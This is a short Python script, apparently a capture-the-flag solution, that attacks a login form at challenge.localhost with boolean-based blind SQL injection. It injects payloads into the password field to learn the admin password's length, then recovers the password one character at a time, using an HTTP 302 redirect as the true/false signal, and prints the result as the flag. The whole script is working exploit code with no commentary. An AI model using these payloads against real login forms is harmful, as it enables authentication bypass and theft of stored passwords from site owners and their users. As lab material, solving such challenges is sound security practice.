import requests

LENGTH=0
FLAG=""

def find_length():
    global LENGTH
    i = 0
    while True:
        d = {
            "username": "admin",
            "password": f"' OR EXISTS(SELECT * FROM users WHERE username='admin' AND length(password) == {i}) -- "
        }
        x = requests.post(f"http://challenge.localhost:80/", data=d, allow_redirects=False)
        if x.status_code == 302:
            print(i)
            LENGTH=i
            break
        i+=1

def find_charachters():
    global FLAG
    for j in range(1, LENGTH+1): 
        i=30
        while True:
            d = {
                "username": "admin",
                "password": f"' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND unicode(substr(password,{j},1)) == {i}) -- "
            }
            x = requests.post(f"http://challenge.localhost:80/", data=d, allow_redirects=False)
            if x.status_code == 302 or i >= 130:
                FLAG += chr(i)
                break
            i+=1

find_length()
find_charachters()

print(FLAG)
